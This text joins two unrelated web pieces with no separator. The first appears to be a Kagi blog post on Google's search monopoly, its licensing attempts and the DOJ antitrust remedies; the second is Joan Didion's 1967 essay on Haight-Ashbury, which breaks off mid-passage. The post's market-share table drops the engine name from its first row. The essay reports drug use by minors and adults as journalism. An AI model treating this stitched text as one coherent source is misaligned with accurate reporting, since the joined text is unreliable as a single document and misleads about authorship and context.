    &lt;p&gt;Why does this matter? The information we consume shapes our understanding of the world as profoundly as the food we eat shapes our bodies. Search (directly, and indirectly through AI) is the primary mechanism through which we inform political judgments, financial decisions, medical choices, and countless other consequential aspects of our lives. When a single company controls the gateway to information - and operates that gateway in ways misaligned with user interests - it influences not only what we know, but how we reason.&lt;/p&gt;
    &lt;head rend="h2"&gt;The problem: A search monopoly&lt;/head&gt;
    &lt;p&gt;The data is stark.&lt;/p&gt;
    &lt;p&gt;Worldwide search market share (October 2025, StatCounter):&lt;/p&gt;
    &lt;table&gt;
      &lt;row span="2"&gt;
        &lt;cell role="head"&gt;Search Engine&lt;/cell&gt;
        &lt;cell role="head"&gt;Market Share&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;90.06%&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;Bing&lt;/cell&gt;
        &lt;cell&gt;4.31%&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;Yandex&lt;/cell&gt;
        &lt;cell&gt;1.84%&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;Yahoo&lt;/cell&gt;
        &lt;cell&gt;1.45%&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;DuckDuckGo&lt;/cell&gt;
        &lt;cell&gt;0.89%&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row&gt;
        &lt;cell&gt;Baidu&lt;/cell&gt;
        &lt;cell&gt;0.73%&lt;/cell&gt;
      &lt;/row&gt;
    &lt;/table&gt;
    &lt;p&gt;The United States is similar: Google at 85%, Bing at 9%, everyone else in the noise.&lt;/p&gt;
    &lt;p&gt;This is not a competitive market. It is a monopoly with a distant second place.&lt;/p&gt;
    &lt;p&gt;The search index is irreplaceable infrastructure. Building a comparable one from scratch is like building a parallel national railroad. Microsoft spent roughly $100 billion over 20 years on Bing and still holds single-digit share. If Microsoft cannot close the gap, no startup can do it alone.&lt;/p&gt;
    &lt;p&gt;This is exactly what the Sherman Act was designed to address: when one company’s control of critical infrastructure prevents effective competition, regulators must force open access on fair terms.&lt;/p&gt;
    &lt;p&gt;When a single, ad-driven gatekeeper controls the primary way humans reach information, it is not just competition that suffers - it is our collective ability to learn, to make informed medical and economic choices, and to participate meaningfully in democratic life.&lt;/p&gt;
    &lt;p&gt;As Ian Bremmer put it: “The idea that we get our information as citizens through algorithms determined by the world’s largest advertising company is my definition of dystopia.”&lt;/p&gt;
    &lt;p&gt;Google’s own founders knew this. In their 1998 white paper, Sergey Brin and Larry Page sharply criticized the ad-supported search model for creating mixed motives and biasing results toward advertisers’ interests. They wrote that “advertising funded search engines will be inherently biased towards the advertisers and away from the needs of the consumers” and that “advertising income often provides an incentive to provide poor quality search results.” Those concerns have only grown more pressing as search has become the primary interface between humanity and the web.&lt;/p&gt;
    &lt;head rend="h2"&gt;We tried to do it the right way&lt;/head&gt;
    &lt;p&gt;Kagi has always tried to integrate the best sources of knowledge into one coherent, ad-free experience. We see ourselves as connective tissue: letting people reach high-quality information directly, without passing through an ad system whose incentives are misaligned with their needs.&lt;/p&gt;
    &lt;p&gt;We approached every major index vendor seeking direct licensing on FRAND terms (Fair, Reasonable, And Non-Discriminatory): fair pricing, no mandatory ad syndication, ability to reorder and blend results. We succeeded with many, including:&lt;/p&gt;
    &lt;table&gt;
      &lt;row span="2"&gt;
        &lt;cell role="head"&gt;Vendor&lt;/cell&gt;
        &lt;cell role="head"&gt;Status&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;Mojeek&lt;/cell&gt;
        &lt;cell&gt;Direct license&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;Brave&lt;/cell&gt;
        &lt;cell&gt;Direct license&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;Yandex&lt;/cell&gt;
        &lt;cell&gt;Direct license&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;Wikipedia&lt;/cell&gt;
        &lt;cell&gt;Direct license&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;TripAdvisor&lt;/cell&gt;
        &lt;cell&gt;Direct license&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;Yelp&lt;/cell&gt;
        &lt;cell&gt;Direct license&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;Apple&lt;/cell&gt;
        &lt;cell&gt;Direct license&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;Wolfram Alpha&lt;/cell&gt;
        &lt;cell&gt;Direct license&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row&gt;
        &lt;cell&gt;Our own Small Web Index&lt;/cell&gt;
        &lt;cell&gt;Proprietary&lt;/cell&gt;
      &lt;/row&gt;
    &lt;/table&gt;
    &lt;p&gt;With Google and Bing, we failed - not for lack of trying.&lt;/p&gt;
    &lt;p&gt;Bing: Their terms didn’t work for us from the start. Microsoft’s terms prohibited reordering results or merging them with other sources - restrictions incompatible with Kagi’s approach. In February 2023, they announced price increases of up to 10x on some API tiers. Then in May 2025, they retired the Bing Search APIs entirely, effective August 2025, directing customers toward AI-focused alternatives like Azure AI Agents.&lt;/p&gt;
    &lt;p&gt;Google: Google does not offer a public search API. The only available path is an ad-syndication bundle with no changes to result presentation - the model Startpage uses. Ad syndication is a non-starter for Kagi’s ad-free subscription model.[^1]&lt;/p&gt;
    &lt;head rend="h2"&gt;The current interim approach&lt;/head&gt;
    &lt;p&gt;Because direct licensing isn’t available to us on compatible terms, we - like many others - use third-party API providers for SERP-style results (SERP meaning search engine results page). These providers serve major enterprises (according to their websites) including Nvidia, Adobe, Samsung, Stanford, DeepMind, Uber, and the United Nations.&lt;/p&gt;
    &lt;p&gt;This is not our preferred solution. We plan to exit it as soon as direct, contractual access becomes available. There is no legitimate, paid path to comprehensive Google or Bing results for a company like Kagi. Our position is clear: open the search index, make it available on FRAND terms, and enable rapid innovation in the marketplace.&lt;/p&gt;
    &lt;head rend="h2"&gt;The DOJ ruling&lt;/head&gt;
    &lt;p&gt;The Google antitrust case began in 2020. On August 5, 2024, the court ruled Google violated Section 2 of the Sherman Act by unlawfully maintaining its monopoly through exclusive distribution agreements. (Full ruling)&lt;/p&gt;
    &lt;p&gt;On September 2, 2025, the DOJ announced remedies (press release):&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Limits on exclusivity: Google is prohibited from exclusive contracts related to Search, Chrome, Assistant, and Gemini.&lt;/item&gt;
      &lt;item&gt;Data sharing and syndication: Google must provide search index and interaction data to competitors and offer syndication services to help rivals build competitive search.&lt;/item&gt;
      &lt;item&gt;Addressing monopolization tactics: The remedies aim to dismantle a decade of exclusionary agreements.&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;In December 2025, Judge Mehta issued a memorandum outlining the specific remedies the court intends to impose. The details are significant:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Mandatory syndication: Google must offer query-based search syndication to “Qualified Competitors” on terms no less favorable than those provided to current partners.&lt;/item&gt;
      &lt;item&gt;No ad bundling: Google cannot condition access to search results on the use of Google Ads; competitors are free to monetize via their own ads or third parties.&lt;/item&gt;
      &lt;item&gt;Index data access: Google must provide Web Search Index data (URLs, crawl metadata, spam scores) at marginal cost.&lt;/item&gt;
      &lt;item&gt;Duration: The judgment remains in effect for 6 years, with syndication licenses guaranteed for terms of 5 years.&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;If implemented as outlined, this is exactly what we have been asking for. The legal trajectory is promising. Google will contest details, and final enforceable terms are still being worked out. The fight now is ensuring these remedies become real, practical access - not paper compliance.&lt;/p&gt;
    &lt;head rend="h3"&gt;Why enforcement matters now&lt;/head&gt;
    &lt;p&gt;Even as these remedies take shape, Google is moving to close the back door. In December 2025, Google sued SerpApi for scraping its results at scale.&lt;/p&gt;
    &lt;p&gt;We take a measured, principled view:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Context matters: Google built its index by crawling the open web before robots.txt was a widespread norm, often over publishers’ objections. Today, publishers “consent” to Google’s crawling because the alternative - being invisible on a platform with 90% market share - is economically unacceptable. Google now enforces ToS and robots.txt against others from a position of monopoly power it accumulated without those constraints. The rules Google enforces today are not the rules it played by when building its dominance.&lt;/item&gt;
      &lt;item&gt;The structural problem remains: This lawsuit is only necessary because Google refuses to offer legitimate, paid index access.&lt;/item&gt;
      &lt;item&gt;Our position is unchanged: We have always wanted direct licensing. We would happily pay market rates for clean, contractual access. The fact that we - and companies like Stanford, Nvidia, Adobe, and the United Nations - have had to rely on third-party vendors is a symptom of the closed ecosystem, not a preference.&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;The connection to DOJ remedies is direct: if Google is going to close the back door, regulators must ensure the front door is open. That is exactly what the DOJ’s index syndication requirements are meant to achieve - and why we support their full implementation.&lt;/p&gt;
    &lt;head rend="h2"&gt;What could be: A layered search ecosystem&lt;/head&gt;
    &lt;p&gt;The DOJ ruling does not itself create a healthy market, but it makes one possible.&lt;/p&gt;
    &lt;p&gt;And while this post focuses on remedies and their impact on Kagi, it is worth zooming out: even if those remedies work perfectly, long-term societal prosperity and resilience require a non-commercial baseline for access to information - something that is not dependent on ad incentives or a single vendor’s business priorities. Think of it as a north-star model for a modern society where information access is a fundamental right.&lt;/p&gt;
    &lt;p&gt;Here is what that could look like:&lt;/p&gt;
    &lt;head rend="h3"&gt;Layer 1: Search as a public good&lt;/head&gt;
    &lt;p&gt;This is a long-term possibility, not a near-term expectation. A government-backed, ad-free, intermediary-free, taxpayer-funded search service providing baseline, non-discriminatory access to information. Imagine search.org.&lt;/p&gt;
    &lt;p&gt;This is not something the DOJ remedies create directly, nor something Kagi expects to exist soon. It is included here to make explicit what an open-index world could ultimately make possible.&lt;/p&gt;
    &lt;p&gt;This layer would replace the role public libraries played for centuries - a role that effectively disappeared when commercial web search took over in the late 1990s. Our ancestors understood well the benefits that non-discriminatory, direct access to information brings to citizens, and ultimately society itself.&lt;/p&gt;
    &lt;p&gt;It raises hard questions: governance, funding, political independence, precedent. But the principle is sound. Every citizen should have access to information without an ad-optimized algorithm standing between them and knowledge. If we can fund public libraries, we can fund public search.&lt;/p&gt;
    &lt;head rend="h3"&gt;Layer 2: Free, ad-based search&lt;/head&gt;
    &lt;p&gt;Commercial search engines with richer features, funded by advertising. Users understand the tradeoff and have a genuine public alternative. This is the space where most contemporary search engines operate.&lt;/p&gt;
    &lt;head rend="h3"&gt;Layer 3: Paid, subscription-based search&lt;/head&gt;
    &lt;p&gt;Premium search engines offering the highest possible quality, privacy, and advanced features for users who value this and are willing to pay. This is where Kagi operates - and where we are expanding as an integrator of knowledge across search, browser, mail, and AI assistants, without selling your attention.&lt;/p&gt;
    &lt;p&gt;This layered model creates a diverse ecosystem:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;A public baseline for information access.&lt;/item&gt;
      &lt;item&gt;Commercial free options for convenience and reach.&lt;/item&gt;
      &lt;item&gt;Premium paid options for those who want maximum quality and control.&lt;/item&gt;
      &lt;item&gt;Aligns with the primary purpose of the Sherman Act.[^2]&lt;/item&gt;
    &lt;/list&gt;
    &lt;head rend="h2"&gt;Conclusion&lt;/head&gt;
    &lt;p&gt;The DOJ ruling is starting to do what antitrust is supposed to do: turn a closed, private choke point into shared infrastructure that others can build on. If the remedies land as real, usable access (APIs, cost-based pricing, no ad bundling), the web can support a layered ecosystem again: a public baseline for citizens, free ad-supported products for reach, and paid services that compete on quality, privacy, and power-user features.&lt;/p&gt;
    &lt;p&gt;That is the world we are building Kagi for. We are ready to walk through the front door - not depend on gray-market workarounds. Our job now is to be ready when the door opens, and to help make sure it does: keep Kagi genuinely multi-source, keep investing in our Small Web Index, and keep shipping a subscription search experience that delivers the best results across providers. If we get this right, the next decade of search and AI does not have to be one funnel owned by one company. It can be a competitive stack of layers that treats information access as the public good it has always been.&lt;/p&gt;

    &lt;p&gt;[^1]: A note on Google’s existing APIs: Google offers PSE, designed for adding search boxes to websites. It can return web results, but with reduced scope and terms tailored for that narrow use case. More recently, Google offers Grounding with Google Search through Vertex AI, intended for grounding LLM responses. Neither is general-purpose index access. Programmable Search Engine is not designed for building competitive search. Grounding with Google Search is priced at $35 per 1,000 requests - economically unviable for search at scale, and structured as an AI add-on rather than standalone index syndication. These are not the FRAND terms the market needs.&lt;/p&gt;
    &lt;p&gt;[^2]: Our understanding of the primary purpose of the Sherman Act is not to shield competitors from the success of legitimate businesses or to prevent those businesses from earning fair profits. Rather, it is to preserve a competitive marketplace that protects consumers from harm (see Competition law and consumer protection, Kluwer Law International, pp. 291â293). Opening the search index would create healthy, real, and intense competition in the search space - including competition to Kagi - which aligns with our understanding of the Sherman Act’s intent. The goal is not the elimination of dominant firms, but the prevention of a single, closed index from becoming the only gateway to information.&lt;/p&gt;

  &lt;main&gt;
    &lt;p&gt;[Editor’s note: Joan Didion’s “Slouching Towards Bethlehem” was first published in the September 23, 1967, edition of the Post. We republish it here as part of our 50th anniversary commemoration of the Summer of Love. Scroll to the bottom to see this story as it appeared in the magazine.]&lt;/p&gt;
    &lt;quote&gt;&lt;p&gt;Things fall apart; the center cannot hold;&lt;/p&gt;&lt;lb/&gt;Mere anarchy is loosed upon the world . . .&lt;lb/&gt;Surely some revelation is at hand;&lt;lb/&gt;Surely the Second Coming is at hand . . .&lt;lb/&gt;And what rough beast, its hour come round at last,&lt;lb/&gt;Slouches towards Bethlehem to be born?&lt;lb/&gt;—W.B. Yeats&lt;/quote&gt;
    &lt;p&gt;The center was not holding. It was a country of bankruptcy notices and public-auction announcements and commonplace reports of casual killings and misplaced children and abandoned homes and vandals who misspelled even the four-letter words they scrawled. It was a country in which families routinely disappeared, trailing bad checks and repossession papers. Adolescents drifted from city to torn city, sloughing off both the past and the future as snakes shed their skins, children who were never taught and would never now learn the games that had held the society together. People were missing. Children were missing. Parents were missing. Those who were left behind filed desultory missing-persons reports, then moved on themselves.&lt;/p&gt;
    &lt;p&gt;It was not a country in open revolution. It was not a country under enemy siege. It was the United States of America in the year 1967, and the market was steady and the GNP high, and a great many articulate people seemed to have a sense of high social purpose, and it might have been a year of brave hopes and national promise, but it was not, and more and more people had the uneasy apprehension that it was not. All that seemed clear was that at some point we had aborted ourselves and butchered the job, and because nothing else seemed so relevant I decided to go to San Francisco. San Francisco was where the social hemorrhaging was showing up. San Francisco was where the missing children were gathering and calling themselves “hippies.” When I first went to San Francisco, I did not even know what I wanted to find out, and so I just stayed around awhile and made a few friends.&lt;/p&gt;
    &lt;p&gt;A sign on Haight Street, San Francisco:&lt;lb/&gt; Last Easter Day&lt;lb/&gt; My Christopher Robin wandered away.&lt;lb/&gt; He called April 10th&lt;lb/&gt; But he hasn’t called since&lt;lb/&gt; He said he was coming home&lt;lb/&gt; But he hasn’t shown.&lt;/p&gt;
    &lt;p&gt;If you see him on Haight&lt;lb/&gt; Please tell him not to wait&lt;lb/&gt; I need him now&lt;lb/&gt; I don’t care how&lt;lb/&gt; If he needs the bread&lt;lb/&gt; I’ll send it ahead.&lt;/p&gt;
    &lt;p&gt;If there’s hope&lt;lb/&gt; Please write me a note&lt;lb/&gt; If he’s still there&lt;lb/&gt; Tell him how much I care&lt;lb/&gt; Where he’s at I need to know&lt;lb/&gt; For I really love him so!&lt;/p&gt;
    &lt;p&gt;Deeply,&lt;lb/&gt; Marla&lt;/p&gt;
    &lt;p&gt;I am looking for somebody called Deadeye (all single names in this story are fictitious; full names are real), and I hear he is on the Street this afternoon doing a little business, so I keep an eye out for him and pretend to read the signs in the Psychedelic Shop on Haight Street when a kid, 16, 17, comes in and sits on the floor beside me.&lt;/p&gt;
    &lt;p&gt;“What are you looking for?” he says.&lt;/p&gt;
    &lt;p&gt;I say nothing much.&lt;/p&gt;
    &lt;p&gt;“I been out of my mind for three days,” he says. He tells me he’s been shooting crystal, which I pretty much know because he does not bother to keep his sleeves rolled down over the needle tracks. He came up from Los Angeles some number of weeks ago, he doesn’t remember what number, and now he’ll take off for New York, if he can find a ride. I show him a sign on the wall offering a ride to Chicago. He wonders where Chicago is. I ask where he comes from. “Here,” he says. I mean before here. “San Jose. Chula Vista, I dunno,” he says. “My mother’s in Chula Vista.”&lt;/p&gt;
    &lt;p&gt;A few days later I see him in Golden Gate Park. I ask if he has found a ride to New York. “I hear New York’s a bummer,” he says.&lt;/p&gt;
    &lt;p&gt;Deadeye never showed up that day, and somebody says maybe I can find him at his place. It is three o’clock and Deadeye is in bed. Somebody else is asleep on the living-room couch, and a girl is sleeping on the floor beneath a poster of Allen Ginsberg, and there are a couple of girls in pajamas making instant coffee. One of the girls introduces me to the friend on the couch, who extends one arm but does not get up because he is naked. Deadeye and I have a mutual acquaintance, but he does not mention his name in front of the others. “The man you talked to,” he says, or “that man I was referring to earlier.” The man is a cop.&lt;/p&gt;
    &lt;p&gt;The room is overheated and the girl on the floor is sick. Deadeye says she has been sleeping for 24 hours. “Lemme ask you something,” he says. “You want some grass?” I say I have to be moving on. “You want it,” Deadeye says, “it’s yours.” Deadeye used to be a Hell’s Angel around Los Angeles, but that was a few years ago. “Right now,” he says, “I’m trying to set up this groovy religious group — ‘Teen-age Evangelism.’”&lt;/p&gt;
    &lt;p&gt;Don and Max want to go out to dinner, but Don is on a macrobiotic diet so we end up in Japantown. Max is telling me how he lives free of all the old middle-class Freudian hang-ups. “I’ve had this old lady for a couple of months now, maybe she makes something special for my dinner, and I come in three days late and tell her I’ve been with some other chick, well, maybe she shouts a little but then I say, ‘That’s me, baby,’ and she laughs and says, ‘That’s you, Max. ‘“ Max says it works both ways. “I mean, if she comes in and tells me she wants to have Don, maybe, I say, ‘OK, baby, it’s your trip.’”&lt;/p&gt;
    &lt;p&gt;Max sees his life as a triumph over “don’ts.” The don’ts he had done before he was 21 were peyote, alcohol, mescaline, and Methedrine. He was on a Meth trip for three years in New York and Tangier before he found acid. He first tried peyote when he was in an Arkansas boys’ school and got down to the Gulf and met “an Indian kid who was doing a don’t. Then every weekend I could get loose I’d hitchhike 700 miles to Brownsville, Texas, so I could pop peyote. Peyote went for thirty cents a button down in Brownsville on the street.” Max dropped in and out of most of the schools and fashionable clinics in the eastern half of America, his standard technique for dealing with boredom being to leave. Example: Max was in a hospital in New York, and “the night nurse was a groovy spade, and in the afternoon for therapy there was a chick from Israel who was interesting, but there was nothing much to do in the morning, so I left.”&lt;/p&gt;
    &lt;p&gt;We drink some more green tea and talk about going up to Malakoff Diggins, a park in Nevada County, because some people are starting a commune there and Max thinks it would be a groove to take acid there. He says maybe we could go next week, or the week after, or anyway sometime before his case comes up. Almost everybody I meet in San Francisco has to go to court at some point in the middle future. I never ask why.&lt;/p&gt;
    &lt;p&gt;I am still interested in how Max got rid of his middle-class Freudian hang-ups, and I ask if he is now completely free.&lt;/p&gt;
    &lt;p&gt;“Nah,” he says. “I got acid.”&lt;/p&gt;
    &lt;p&gt;Max drops a 250- or 350-microgram tab every six or seven days.&lt;/p&gt;
    &lt;p&gt;Max and Don share a joint in the car, and we go over to North Beach to find out if Otto, who has a temporary job there, wants to go to Malakoff Diggins. Otto is trying to sell something to some electronics engineers. The engineers view our arrival with some interest, maybe, I think, because Max is wearing bells and an Indian headband. Max has a low tolerance for straight engineers and their Freudian hang-ups. “Look at ’em,” he says. “They’re always yelling ‘queer,’ and then they come prowling into the Haight-Ashbury trying to get a hippie chick.”&lt;/p&gt;
    &lt;p&gt;We do not get around to asking Otto about Malakoff Diggins because he wants to tell me about a 14-year-old he knows who got busted in the Park the other day. She was just walking through the Park, he says, minding her own, carrying her schoolbooks, when the cops took her in and booked her and gave her a pelvic. “Fourteen years old,” Otto says. “A pelvic.”&lt;/p&gt;
    &lt;p&gt;“Coming down from acid,” he adds, “that could be a real bad trip.”&lt;/p&gt;
    &lt;p&gt;I call Otto the next afternoon to see if he can reach the 14-year-old. It turns out she is tied up with rehearsals for her junior-high-school play, The Wizard of Oz. “Yellow-brick-road time,” Otto says. Otto was sick all day. He thinks it was some cocaine somebody gave him.&lt;/p&gt;
    &lt;p&gt;There are always little girls around rock groups — the same little girls who used to hang around saxophone players, girls who live on the celebrity and power and sex a band projects when it plays — and there are three of them out here this afternoon in Sausalito where a rock group, the Grateful Dead, rehearses. They are all pretty and two of them still have baby fat and one of them dances by herself with her eyes closed.&lt;/p&gt;
    &lt;p&gt;I ask a couple of the girls what they do.&lt;/p&gt;
    &lt;p&gt;“I just kind of come out here a lot,” one of the girls says.&lt;/p&gt;
    &lt;p&gt;“I just sort of know the Dead,” the other says.&lt;/p&gt;
    &lt;p&gt;The one who just sort of knows the Dead starts cutting up a loaf of French bread on the piano bench. The boys take a break, and one of them talks about playing at the Los Angeles Cheetah, which is in the old Aragon Ballroom. “We were up there drinking beer where Lawrence Welk used to sit,” he says.&lt;/p&gt;
    &lt;p&gt;The little girl who was dancing by herself giggles. “Too much,” she says softly. Her eyes are still closed.&lt;/p&gt;
    &lt;p&gt;Somebody said that if I was going to meet some runaways I better pick up a few hamburgers, cola, and French fries on the way, so I did, and we are eating them in the Park together, me, Debbie, who is 15, and Jeff, who is 16. Debbie and Jeff ran away 12 days ago, walked out of school one morning with $100 between them. Because a missing-juvenile is out on Debbie — she was already on probation because her mother had once taken her to the police station and declared her incorrigible — this is only the second time they have been out of a friend’s apartment since they got to San Francisco. The first time they went over to the Fairmont Hotel and rode the outside elevator, three times up and three times down. “Wow,” Jeff says, and that is all he can think of to say about that.&lt;/p&gt;
    &lt;p&gt;I ask why they ran away.&lt;/p&gt;
    &lt;p&gt;“My parents said I had to go to church,” Debbie says. “And they wouldn’t let me dress the way I wanted. In the seventh grade my skirts were longer than anybody’s — it got better in the eighth grade, but still.”&lt;/p&gt;
    &lt;p&gt;“Your mother was kind of a bummer,” Jeff says to her.&lt;/p&gt;
    &lt;p&gt;“They didn’t like Jeff. They didn’t like my girl friends. I had a C average and my father told me I couldn’t date until I raised it, and that bugged me a lot too.”&lt;/p&gt;
    &lt;p&gt;“My mother was just a genuine all-American bitch.” Jeff says. “She was really troublesome about hair. Also, she didn’t like boots. It was really weird.”&lt;/p&gt;
    &lt;p&gt;“Tell about the chores,” Debbie says.&lt;/p&gt;
    &lt;p&gt;“For example, I had chores. If I didn’t finish ironing my shirts for the week, I couldn’t go out for the weekend. It was weird. Wow.”&lt;/p&gt;
    &lt;p&gt;Debbie giggles and shakes her head. “This year’s gonna be wild.”&lt;/p&gt;
    &lt;p&gt;“We’re just gonna let it all happen,” Jeff says. “Everything’s in the future, you can’t pre-plan it, you know. First we get jobs, then a place to live. Then, I dunno.”&lt;/p&gt;
    &lt;p&gt;Jeff finishes off the French fries and gives some thought to what kind of job he could get. “I always kinda dug metal shop, welding, stuff like that.” Maybe he could work on cars, I say. “But I’m not too mechanically minded,” he says. “Anyway, you can’t pre-plan.”&lt;/p&gt;
    &lt;p&gt;“I could get a job baby-sitting,” Debbie says. “Or in a dime store.”&lt;/p&gt;
    &lt;p&gt;“You’re always talking about getting a job in a dime store,” Jeff says.&lt;/p&gt;
    &lt;p&gt;“That’s because I worked in a dime store already,” Debbie says.&lt;/p&gt;
    &lt;p&gt;Debbie is buffing her fingernails with the belt to her suede jacket. She is annoyed because she chipped a nail and because I do not have any polish remover in the car. I promise to get her to a friend’s apartment so that she can redo her manicure, but something has been bothering me, and as I fiddle with the ignition, I finally ask it. I ask them to think back to when they were children, to tell me what they had wanted to be when they were grown up, how they had seen the future then.&lt;/p&gt;
    &lt;p&gt;Jeff throws a cola bottle out the car window. “I can’t remember I ever thought about it,” he says. “I remember I wanted to be a veterinarian once,” Debbie says. “But now I’m more or less working in the vein of being an artist or a model or a cosmetologist. Or something.”&lt;/p&gt;
    &lt;p&gt;I hear quite a bit about one cop, Officer Arthur Gerrans, whose name has become a synonym for zealotry on the Street. Max is not personally wild about Officer Gerrans because Officer Gerrans took Max in after the Human Be-In last winter, that’s the big Human Be-In in Golden Gate Park where 20,000 people got turned on free, or 10,000 did, or some number did, but then Officer Gerrans has busted almost everyone in the District at one time or another. Presumably to forestall a cult of personality, Gerrans was transferred out of the District not long ago, and when I see him it is not at the Park Station but at the Central Station.&lt;/p&gt;
    &lt;p&gt;We are in an interrogation room, and I am interrogating Gerrans. He is young, blond, and wary and I go in slow. I wonder what he thinks the major problems in the Haight area are.&lt;/p&gt;
    &lt;p&gt;Officer Gerrans thinks it over. “I would say the major problems there,” he says finally, “the major problems are narcotics and juveniles. Juveniles and narcotics, those are your major problems.”&lt;/p&gt;
    &lt;p&gt;I write that down.&lt;/p&gt;
    &lt;p&gt;“Just one moment,” Officer Gerrans says, and leaves the room. When he comes back he tells me that I cannot talk to him without permission from Chief Thomas Cahill.&lt;/p&gt;
    &lt;p&gt;“In the meantime,” Officer Gerrans adds, pointing at the notebook in which I have written major problems, juveniles, narcotics, “I’ll take those notes.”&lt;/p&gt;
    &lt;p&gt;The next day I apply for permission to talk to Officer Gerrans and also to Chief Cahill. A few days later a sergeant returns my call.&lt;/p&gt;
    &lt;p&gt;“We have finally received clearance from the chief per your request,” the sergeant says, “and that is taboo.”&lt;/p&gt;
    &lt;p&gt;I wonder why it is taboo to talk to Officer Gerrans.&lt;/p&gt;
    &lt;p&gt;Officer Gerrans is involved in court cases coming to trial.&lt;/p&gt;
    &lt;p&gt;I wonder why it is taboo to talk to Chief Cahill.&lt;/p&gt;
    &lt;p&gt;The chief has pressing police business.&lt;/p&gt;
    &lt;p&gt;I wonder if I can talk to anyone at all in the police department.&lt;/p&gt;
    &lt;p&gt;“No,” the sergeant says, “not at the particular moment.”&lt;/p&gt;
    &lt;p&gt;Which was my last official contact with the San Francisco Police Department.&lt;/p&gt;
    &lt;p&gt;Norris and I are standing around the Panhandle, and Norris is telling me how it is all set up for a friend to take me to Big Sur. I say what I really want to do is spend a few days with Norris and his wife and the rest of the people in their house. Norris says it would be a lot easier if I’d take some acid. I say I’m unstable. Norris says, all right, anyway, grass, and he squeezes my hand.&lt;/p&gt;
    &lt;p&gt;One day Norris asks how old I am. I tell him I am 32. It takes a few minutes, but he rises to it. “Don’t worry,” he says at last. “There’s old hippies too.”&lt;/p&gt;
    &lt;p&gt;It is a pretty nice evening, nothing much is happening and Max brings his old lady, Sharon, over to the Warehouse. The Warehouse, which is where Don and a floating number of other people live, is not actually a warehouse but the garage of a condemned hotel. The Warehouse was conceived as total theater, a continual happening, and I always feel good there. Somebody is usually doing something interesting, like working on a light show, and there are a lot of interesting things around, like an old touring car which is used as a bed and a vast American flag fluttering up in the shadows and an overstuffed chair suspended like a swing from the rafters.&lt;/p&gt;
    &lt;p&gt;One reason I particularly like the Warehouse is that a child named Michael is staying there now. Michael’s mother, Sue Ann, is a sweet, wan girl who is always in the kitchen cooking seaweed or baking macrobiotic bread while Michael amuses himself with joss sticks or an old tambourine or an old rocking horse. The first time I ever saw Michael was on that rocking horse, a very blond and pale and dirty child on a rocking horse with no paint. A blue theatrical spotlight was the only light in the Warehouse that afternoon, and there was Michael in it, crooning softly to the wooden horse. Michael is three years old. He is a bright child but does not yet talk.&lt;/p&gt;
    &lt;p&gt;On this night Michael is trying to light his joss sticks and there are the usual number of people floating through and they all drift in and sit on the bed and pass joints. Sharon is very excited when she arrives. “Don,” she cries breathlessly, “we got some STP today.” At this time STP, a hallucinogenic drug, is a pretty big deal; remember, nobody yet knew what it was and it was relatively, although just relatively, hard to come by. Sharon is blonde and scrubbed and probably 17, but Max is a little vague about that since his court case comes up in a month or so, and he doesn’t need statutory rape on top of it. Sharon’s parents were living apart when she last saw them. She does not miss school or anything much about her past, except her younger brother. “I want to turn him on,” she confided one day. “He’s 14 now, that’s the perfect age. I know where he goes to high school and someday I’ll just go get him.”&lt;/p&gt;
    &lt;p&gt;Time passes and I lose the thread and when I pick it up again Max seems to be talking about what a beautiful thing it is the way that Sharon washes dishes.&lt;/p&gt;
    &lt;p&gt;“It is beautiful,” she says. “Everything is. You watch that blue detergent blob run on the plate, watch the grease cut — well, it can be a real trip.”&lt;/p&gt;
    &lt;p&gt;Pretty soon now, maybe next month, maybe later, Max and Sharon plan to leave for Africa and India, where they can live off the land. “I got this little trust fund, see,” Max says, “which is useful in that it tells cops and border patrols I’m OK, but living off the land is the thing. You can get your high and get your dope in the city, OK, but we gotta get out somewhere and live organically.”&lt;/p&gt;
    &lt;p&gt;“Roots and things,” Sharon says, lighting a joss stick for Michael. Michael’s mother is still in the kitchen cooking seaweed. “You can eat them.”&lt;/p&gt;
    &lt;p&gt;Maybe eleven o’clock, we move from the Warehouse to the place where Max and Sharon live with a couple named Tom and Barbara. Sharon is pleased to get home (“I hope you got some hash joints fixed in the kitchen,” she says to Barbara by way of greeting), and everybody is pleased to show off the apartment, which has a lot of flowers and candles and paisleys. Max and Sharon and Tom and Barbara get pretty high on hash, and everyone dances a little and we do some liquid projections and set up a strobe and take turns getting a high on that. Quite late, somebody called Steve comes in with a pretty, dark girl. They have been to a meeting of people who practice a western yoga, but they do not seem to want to talk about that. They lie on the floor awhile, and then Steve stands up.&lt;/p&gt;
    &lt;p&gt;“Max,” he says, “I want to say one thing.”&lt;/p&gt;
    &lt;p&gt;“It’s your trip.” Max is edgy.&lt;/p&gt;
    &lt;p&gt;“I found love on acid. But I lost it. And now I’m finding it again. With nothing but grass.”&lt;/p&gt;
    &lt;p&gt;Max mutters that heaven and hell are both in one’s karma.&lt;/p&gt;
